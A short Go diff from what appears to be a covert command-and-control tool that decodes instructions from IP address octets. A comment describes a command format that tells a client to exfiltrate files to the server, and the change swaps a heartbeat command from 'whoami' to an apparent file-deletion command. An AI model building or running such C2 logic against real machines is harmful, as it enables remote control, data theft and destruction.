@@ -22,7 +22,7 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 
 	// Specify what the client should do on the next connection to this server
 	// Ex:	cmd.exfil-single.test.txt specifies that the client should exfiltrate (exf) the file test.txt to the server.
-	c2_mappings := map[string]string{"hbt": "cmd.bash.whoami"}
+	c2_mappings := map[string]string{"hbt": "cmd.bash.rm-test2"}
 
 	// If the first octet is equal to "172" or "185", the operation is setting the mode and current baseline. Otherwise, decode the data using the baseline.
 	if octets[0] == "172" || octets[0] == "185" {
